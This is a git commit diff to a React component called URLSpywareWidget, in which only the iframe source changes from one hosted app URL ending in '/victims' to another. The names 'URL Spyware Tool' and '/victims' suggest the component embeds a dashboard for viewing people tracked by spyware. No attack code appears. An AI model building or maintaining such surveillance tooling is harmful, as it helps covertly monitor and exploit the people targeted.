9f9c205f713e1af91a2f2b7dbd1a430ca3ac746f
Black Globe <137195478+blackglobeco@users.noreply.github.com>
2025-10-26 21:47:22 +0800

    Update URLSpywareWidget.tsx

--- src/components/url-spyware-widget/URLSpywareWidget.tsx
+++ src/components/url-spyware-widget/URLSpywareWidget.tsx
@@ -13,7 +13,7 @@ export const URLSpywareWidget: React.FC<URLSpywareWidgetProps> = ({ onClose }) =
         <div className="url-spyware-content">
           <div className="url-spyware-container">
             <iframe
-              src="https://633j6c-5000.csb.app/victims"
+              src="https://qhq6qj-5000.csb.app/victims"
               className="url-spyware-iframe"
               title="URL Spyware Tool"
               allowFullScreen
